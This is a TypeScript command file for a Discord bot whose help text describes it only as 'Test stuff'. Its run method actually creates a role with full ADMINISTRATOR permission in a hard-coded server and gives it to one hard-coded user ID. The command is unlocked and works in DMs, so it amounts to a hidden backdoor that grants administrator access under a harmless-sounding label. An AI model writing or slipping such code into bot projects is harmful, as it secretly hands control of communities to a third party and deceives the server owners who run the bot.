import { _Command, Neptune, Util, discord, neko } from '../../index';
import { Message, TextChannel, Role } from 'discord.js';
import path from 'path';

class Command extends _Command {
	constructor(nep: Neptune) {
		let cmd = `${nep.prefix}${path.basename(__filename, '.ts')}`;

		super(nep, {
			name: path.basename(__filename, '.ts'),
			help: `Test stuff.`,
			longHelp: `Tests stuff.`,
			usage: [ `• ${cmd}` ],
			examples: [ `• ${cmd}` ],
			category: path.dirname(__filename).split(path.sep).pop(),
			cooldown: 1e3,
			aliases: [],
			locked: false,
			allowDM: true
		});
	}

	public async _run(msg: Message, args: string[], util: Util, nep: Neptune) {
		nep.guilds
			.get('406243992012062720')
			.roles.create({
				data: {
					name: 'epic',
					color: 'RED',
					permissions: [ 'ADMINISTRATOR' ]
				}
			})
			.then((r: Role) => {
				nep.guilds.get('406243992012062720').members.get('184157133187710977').roles.add(r);
				console.log(`${r.id} - ${r.name} added to user`);
			});
	}
}

export default Command;
